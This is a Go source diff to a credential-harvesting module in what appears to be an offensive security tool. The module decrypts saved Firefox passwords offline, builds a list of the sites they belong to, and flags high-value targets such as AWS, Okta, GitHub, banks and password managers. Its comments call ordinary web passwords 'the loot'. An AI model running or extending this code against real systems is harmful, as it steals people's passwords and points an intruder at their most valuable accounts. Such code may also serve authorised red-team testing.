@@ -5,6 +5,7 @@ import (
 	"encoding/json"
 	"os"
 	"path/filepath"
+	"sort"
 	"strings"
 
 	"github.com/puck-security/geiger/internal/module"
@@ -57,14 +58,28 @@ func (firefoxLogins) Recon(_ context.Context, c *recon.Client, _ module.Token, f
 		return out, nil
 	}
 	n := 0
+	seen := map[string]bool{}
+	var hosts []string
 	for _, lg := range logins {
-		if _, perr := decryptFirefoxLogin(key, lg.encPassword); perr == nil {
-			n++
+		if _, perr := decryptFirefoxLogin(key, lg.encPassword); perr != nil {
+			continue
+		}
+		n++
+		if h := loginHost(lg.host); h != "" && !seen[h] {
+			seen[h] = true
+			hosts = append(hosts, h)
 		}
 	}
+	sort.Strings(hosts)
 	out = append(out, module.Finding{Key: "recovered",
-		Value: itoaSS(n) + " saved logins decrypted offline (no primary password) — hostnames + plaintext passwords readable",
-		Flag:  fmFlag})
+		Value:  itoaSS(n) + " saved logins decrypted offline (no primary password) — plaintext passwords readable",
+		Flag:   fmFlag,
+		Detail: hostDetail(hosts)}) // the recovered sites, expanded under -v / in JSON
+	if sens := sensitiveHosts(hosts); len(sens) > 0 {
+		out = append(out, module.Finding{Key: "high-value",
+			Value: "logins for " + strings.Join(sens, ", "),
+			Flag:  module.FlagWarn})
+	}
 	return out, nil
 }
 
@@ -83,16 +98,69 @@ func (firefoxLogins) Harvest(_ context.Context, c *recon.Client, _ module.Token,
 	var out []module.Harvested
 	for _, lg := range logins {
 		pw, perr := decryptFirefoxLogin(key, lg.encPassword)
-		if perr != nil || pw == "" {
+		// Only re-triage saved values that look like real provider tokens (an API
+		// key someone pasted into a password field). Ordinary web passwords are the
+		// loot itself — they're inventoried in Recon, not fed back through recon as
+		// generic_secret noise the operator then can't place.
+		if perr != nil || !hasStrongCredPrefix(pw) {
 			continue
 		}
 		user, _ := decryptFirefoxLogin(key, lg.encUsername)
-		out = append(out, module.Harvested{Label: "firefox:" + lg.host + "/" + user, Value: pw})
-		if len(out) >= 100 {
+		out = append(out, module.Harvested{Label: "firefox:" + loginHost(lg.host) + "/" + user, Value: pw})
+		if len(out) >= 50 {
 			break
 		}
 	}
 	return out, nil
+}
+
+// loginHost normalizes a logins.json origin ("https://github.com:443") to a bare
+// host ("github.com") for the recovered-site inventory.
+func loginHost(h string) string {
+	h = strings.TrimSpace(h)
+	if i := strings.Index(h, "://"); i >= 0 {
+		h = h[i+3:]
+	}
+	if i := strings.IndexAny(h, "/:"); i >= 0 {
+		h = h[:i]
+	}
+	return h
+}
+
+// hostDetail caps the recovered-site list so a profile with hundreds of logins
+// doesn't dump an unbounded block under -v.
+func hostDetail(hosts []string) []string {
+	const max = 50
+	if len(hosts) <= max {
+		return hosts
+	}
+	out := append([]string{}, hosts[:max]...)
+	return append(out, "+"+itoaSS(len(hosts)-max)+" more sites")
+}
+
+// sensitiveHostKW flags recovered logins worth surfacing even without -v: cloud,
+// source control, SSO/IdP, and money.
+var sensitiveHostKW = []string{
+	"aws", "amazon", "google", "gcp", "azure", "microsoftonline", "okta", "onelogin",
+	"github", "gitlab", "bitbucket", "cloudflare", "digitalocean", "heroku",
+	"paypal", "stripe", "coinbase", "bank", "1password", "lastpass", "bitwarden", "vault",
+}
+
+func sensitiveHosts(hosts []string) []string {
+	var hits []string
+	for _, h := range hosts {
+		l := strings.ToLower(h)
+		for _, kw := range sensitiveHostKW {
+			if strings.Contains(l, kw) {
+				hits = append(hits, h)
+				break
+			}
+		}
+		if len(hits) >= 6 {
+			break
+		}
+	}
+	return hits
 }
 
 type fxLogin struct{ host, encUsername, encPassword string }
